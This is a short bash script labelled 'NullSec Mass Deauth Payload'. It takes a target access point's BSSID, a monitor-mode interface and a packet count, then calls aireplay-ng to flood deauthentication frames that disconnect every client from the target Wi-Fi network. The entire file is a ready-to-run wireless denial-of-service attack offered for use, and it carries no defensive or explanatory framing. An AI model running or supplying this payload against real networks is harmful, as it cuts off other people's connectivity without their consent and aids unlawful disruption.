#!/bin/bash
# NullSec Mass Deauth Payload
# Deauths all clients from target network

TARGET_BSSID="$1"
IFACE="${2:-wlan1mon}"
COUNT="${3:-100}"

if [[ -z "$TARGET_BSSID" ]]; then
    echo "Usage: $0 <target_bssid> [interface] [count]"
    exit 1
fi

echo "[*] NullSec Mass Deauth"
echo "[*] Target: $TARGET_BSSID"
echo "[*] Interface: $IFACE"
echo "[*] Packets: $COUNT"

aireplay-ng -0 $COUNT -a "$TARGET_BSSID" $IFACE
